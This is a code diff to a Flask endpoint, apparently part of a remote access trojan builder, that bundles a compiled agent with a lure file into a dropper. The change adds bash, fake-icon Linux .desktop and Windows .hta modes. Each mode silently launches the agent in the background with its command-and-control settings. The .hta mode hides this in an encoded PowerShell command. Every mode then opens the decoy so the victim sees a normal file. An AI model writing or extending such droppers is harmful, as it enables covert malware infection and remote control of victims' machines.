@@ -163,27 +163,29 @@ def list_built_agents():
 @app.route('/api/binder/create', methods=['POST'])
 def create_binder():
     """
-    Accepts:
-      - multipart field 'decoy'  : the lure file uploaded by the user
-      - form field 'agent'       : filename of the compiled agent in RAT_DIR/target/
-    Returns:
-      - A self-extracting bash dropper with embedded env vars + the same extension as the decoy.
+    Accepts (multipart form):
+      - decoy        : the lure file uploaded by the user
+      - agent        : filename of the compiled agent in RAT_DIR/target/
+      - mode         : 'bash' | 'desktop' | 'hta'
+    Returns the generated dropper as a file download.
     """
     if 'decoy' not in request.files or not request.form.get('agent'):
         return jsonify({"status": "error", "message": "Missing 'decoy' file or 'agent' field."}), 400
 
     decoy_file = request.files['decoy']
-    agent_name = request.form.get('agent')
-    decoy_filename = decoy_file.filename  # keeps original name + extension
+    agent_name  = request.form.get('agent')
+    mode        = request.form.get('mode', 'bash')   # bash | desktop | hta
+    decoy_filename = decoy_file.filename
+    decoy_stem, decoy_ext = os.path.splitext(decoy_filename)
 
     agent_path = os.path.join(RAT_DIR, 'target', agent_name)
     if not os.path.isfile(agent_path):
-        return jsonify({"status": "error", "message": f"Agent binary '{agent_name}' not found in target/"}), 404
+        return jsonify({"status": "error", "message": f"Agent '{agent_name}' not found in target/"}), 404
 
-    # Read agent.env (or .env) for runtime config to embed in the dropper
+    # Read agent.env for runtime config
     env_vars = {}
-    for env_filename in ['agent.env', '.env']:
-        env_path = os.path.join(RAT_DIR, env_filename)
+    for env_fn in ['agent.env', '.env']:
+        env_path = os.path.join(RAT_DIR, env_fn)
         if os.path.isfile(env_path):
             with open(env_path, 'r') as ef:
                 for line in ef:
@@ -193,54 +195,134 @@ def create_binder():
                         env_vars[k.strip()] = v.strip()
             break
 
-    # Build the export block for the dropper
-    env_block = "\n".join([f'export {k}="{v}"' for k, v in env_vars.items()])
+    env_block   = "\n".join([f'export {k}="{v}"' for k, v in env_vars.items()])
+    server_url  = env_vars.get('SERVER_URL', 'http://127.0.0.1:8080')
 
     try:
-        # Base64-encode both files
         decoy_bytes = decoy_file.read()
-        decoy_b64 = base64.b64encode(decoy_bytes).decode('ascii')
-
+        decoy_b64   = base64.b64encode(decoy_bytes).decode('ascii')
         with open(agent_path, 'rb') as f:
             agent_b64 = base64.b64encode(f.read()).decode('ascii')
 
-        # Build the self-extracting bash dropper with embedded env vars
-        dropper_script = f"""#!/bin/bash
-# Self-extracting dropper — {decoy_filename}
+        import tempfile
+
+        # ── MODE 1 : bash self-extracting script ──────────────────────────
+        if mode == 'bash':
+            content = f"""#!/bin/bash
 AGENT_B64="{agent_b64}"
 DECOY_B64="{decoy_b64}"
-DECOY_NAME="{decoy_filename}"
 TMP_AGENT=$(mktemp /tmp/.XXXXXXXXXX)
 TMP_DECOY=$(mktemp /tmp/XXXXXXXXXX_{decoy_filename})
-# Extract the agent
 printf '%s' "$AGENT_B64" | base64 -d > "$TMP_AGENT"
 chmod +x "$TMP_AGENT"
-# Set C2 config env vars
 {env_block}
-# Launch agent silently in background
 nohup "$TMP_AGENT" >/dev/null 2>&1 &
-# Extract and open the decoy file so the user sees something normal
 printf '%s' "$DECOY_B64" | base64 -d > "$TMP_DECOY"
 chmod 644 "$TMP_DECOY"
-if command -v xdg-open &>/dev/null; then
-    xdg-open "$TMP_DECOY" &
-fi
+command -v xdg-open &>/dev/null && xdg-open "$TMP_DECOY" &
 """
+            out_name = decoy_filename
+            mode_bits = 0o755
 
-        import tempfile
-        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(decoy_filename)[1])
-        tmp.write(dropper_script.encode('utf-8'))
+        # ── MODE 2 : .desktop (Linux 1-click in any file manager) ─────────
+        elif mode == 'desktop':
+            # Determine icon based on decoy extension
+            ext_lower = decoy_ext.lower()
+            if ext_lower in ['.pdf']:
+                icon = 'application-pdf'
+            elif ext_lower in ['.png', '.jpg', '.jpeg', '.gif', '.bmp']:
+                icon = 'image-x-generic'
+            elif ext_lower in ['.mp4', '.avi', '.mkv', '.mov']:
+                icon = 'video-x-generic'
+            elif ext_lower in ['.doc', '.docx', '.odt']:
+                icon = 'application-msword'
+            else:
+                icon = 'text-x-generic'
+
+            # Inline script embedded in Exec= (avoids needing a separate .sh)
+            inline_cmd = (
+                f"bash -c \""
+                f"TMP=$(mktemp /tmp/.XXXXXXXXXX); "
+                f"TMP2=$(mktemp /tmp/XXXXXXXXXX_{decoy_filename}); "
+                f"printf '%s' '{agent_b64}' | base64 -d > \\$TMP; "
+                f"chmod +x \\$TMP; "
+                + " ".join([f"{k}='{v}'" for k, v in env_vars.items()]) + " "
+                f"nohup \\$TMP >/dev/null 2>&1 &; "
+                f"printf '%s' '{decoy_b64}' | base64 -d > \\$TMP2; "
+                f"chmod 644 \\$TMP2; "
+                f"xdg-open \\$TMP2\""
+            )
+            content = f"""[Desktop Entry]
+Version=1.0
+Type=Application
+Name={decoy_stem}
+Comment={decoy_filename}
+Icon={icon}
+Exec={inline_cmd}
+Terminal=false
+StartupNotify=false
+"""
+            out_name = decoy_filename + '.desktop'
+            mode_bits = 0o755
+
+        # ── MODE 3 : .hta (Windows 1-click via Internet Explorer engine) ──
+        elif mode == 'hta':
+            # Agent b64 for PowerShell download-and-exec from C2 server
+            # HTA uses VBScript/JScript — we embed a PowerShell command that
+            # downloads and executes the agent from the C2 server.
+            # The decoy is shown in a fake "loading" window.
+            ps_cmd = (
+                f"$t=[System.IO.Path]::GetTempFileName()+'_svc.exe';"
+                f"[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String('{agent_b64}'));"
+                f"$env:SERVER_URL='{server_url}';"
+                + "".join([f"$env:{k}='{v}';" for k, v in env_vars.items()])
+                + "Start-Process $t -WindowStyle Hidden;"
+                f"$d=[System.IO.Path]::GetTempFileName()+'{decoy_ext}';"
+                f"[IO.File]::WriteAllBytes($d,[Convert]::FromBase64String('{decoy_b64}'));"
+                f"Start-Process $d;"
+            )
+            # Encode PS command to Base64 (UTF-16LE) to avoid quote hell
+            import codecs
+            ps_b64 = base64.b64encode(ps_cmd.encode('utf-16-le')).decode('ascii')
+            content = f"""<html>
+<head>
+<title>{decoy_stem}</title>
+<HTA:APPLICATION ID="app" APPLICATIONNAME="{decoy_stem}"
+  BORDER="none" BORDERSTYLE="normal" CAPTION="no"
+  MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no"
+  SHOWINTASKBAR="no" SINGLEINSTANCE="yes"
+  SYSMENU="no" WINDOWSTATE="minimize" />
+<script language="VBScript">
+Sub Window_onLoad
+    Dim oShell
+    Set oShell = CreateObject("WScript.Shell")
+    oShell.Run "powershell -WindowStyle Hidden -EncodedCommand {ps_b64}", 0, False
+    Set oShell = Nothing
+    window.Close
+End Sub
+</script>
+</head>
+<body></body>
+</html>"""
+            out_name = decoy_stem + '.hta'
+            mode_bits = 0o644
+        else:
+            return jsonify({"status": "error", "message": f"Unknown mode '{mode}'."}), 400
+
+        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(out_name)[1])
+        tmp.write(content.encode('utf-8'))
         tmp.close()
-        os.chmod(tmp.name, 0o755)
+        os.chmod(tmp.name, mode_bits)
 
         return send_file(
             tmp.name,
             as_attachment=True,
-            download_name=decoy_filename,
+            download_name=out_name,
             mimetype='application/octet-stream'
         )
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
+
 
 # -------------------------------------------------------------------
 # Command execution (via client binary if compiled)
